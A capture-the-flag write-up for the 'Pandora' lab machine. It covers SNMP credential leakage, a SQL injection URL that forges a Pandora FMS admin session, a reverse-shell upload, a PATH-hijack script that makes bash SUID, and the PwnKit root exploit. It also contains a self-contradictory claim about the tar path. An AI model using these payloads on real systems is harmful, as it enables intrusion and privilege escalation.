Pandora is the first box I have ran into that requires a UDP scan to move forward rather than a standard TCP one. This box features finding plaintext creds through snmpwalk, spoofing an admin session from info we found in a mysql database, and abusing path injection to fully compromise the machine.

## Recon

`nmap -sV 10.10.11.136`

Its a static website, don't even bother with it. Gobuster dir and vhosts don't return anything. The contact form on the website does not lead anywhere, its just there for show. Nikto also does not yeild any results. Revisit the drawing board.

We can try a UDP scan instead.

> UDP scans are very slow so we specify a high min rate.

`nmap -sU 10.10.11.136 --min-rate 2000`

Well this is a new attack vector that I had no idea about, let's check out SNMP.

`snmpwalk -v1 -c public 10.10.11.136`
```
iso.3.6.1.2.1.25.4.2.1.5.907 = STRING: "-o -p -- \\u --noclear tty1 linux"
iso.3.6.1.2.1.25.4.2.1.5.980 = ""
iso.3.6.1.2.1.25.4.2.1.5.1117 = STRING: "-u daniel -p HotelBabylon23"
iso.3.6.1.2.1.25.4.2.1.5.5464 = STRING: "-k start"
iso.3.6.1.2.1.25.4.2.1.5.6262 = STRING: "-k start"
```
Plain text creds can be seen from an snmpwalk

`nmap -sU -sVC -p 161  10.10.11.136`
```
[...]
|   1117: 
|     Name: host_check
|     Path: /usr/bin/host_check
|     Params: -u daniel -p HotelBabylon23
```
Another way of seeing the creds is by using a script scan against port 161.

Now using the plain text creds we can ssh into daniel.

`ssh daniel@pandora.htb `
```

## User
After running linpeas, we find that we can run nmap on ourselves. Doing this we can find out our own open ports.

```bash=
daniel@pandora:~$ nmap localhost

Locate the locally hosted webserver from the apach configs/webroot. Dump the sql tables.

> Noteabley the user sessions since the passwords arent crackable
{: .prompt-tip }

We have an admin user so we can log in using their session by generating a cookie.
```
http://localhost/pandora_console/include/chart_generator.php?session_id=%27%20union%20SELECT%201,2,%27id_usuario|s:5:%22admin%22;%27%20endof%20%20--%20endof
```
From here we can upload a reverse shell since we have file upload and then hit it. These webshells are generally pretty janky so what we can do it force create a ssh key and grab the private key so that we can login. The commands to do so:
`ssh-keygen`
`cat id_rsa.pub > authorized_keys`
`chmod 600 authorized_keys`

## Root
The web user can run this custom SUID found from `find / -perm -4000 2>/dev/null`. /usr/bin/pandora_backup is the exploitable binary. Viewing it with strings we see that the tar command is specified with an absolute path. This is vulnerable to path injection. Just run `export PATH=/my/path:$PATH`

From there we create our malicious tar with the contents
```
#!/bin/bash
chmod 7777 /bin/bash
```
This creates bash as an SUID as root. Run `bash -p` to gain the root shell. Pwnded :)

### Pwnkit
Running linpeas shows you
```
[...]
╔══════════╣ CVEs Check
Vulnerable to CVE-2021-4034                 
```
This CVE is pwnkit and running it should get you instant root.

```
daniel@pandora:~$ ./Pwnkit
root@pandora:
```

```
root@pandora:/home/daniel# ls -la /home
total 16
drwxr-xr-x  4 root   root   4096 Dec  7 14:32 .
drwxr-xr-x 18 root   root   4096 Dec  7 14:32 ..
drwxr-xr-x  7 daniel daniel 4096 Apr 23 05:53 daniel
drwxr-xr-x  3 matt   matt   4096 Apr 22 18:21 matt
root@pandora:/home/daniel# cat /home/matt/user.txt
7e328d9b93d565137e31e20fd9fce3ba
```
Now we grab the user flag and we are done
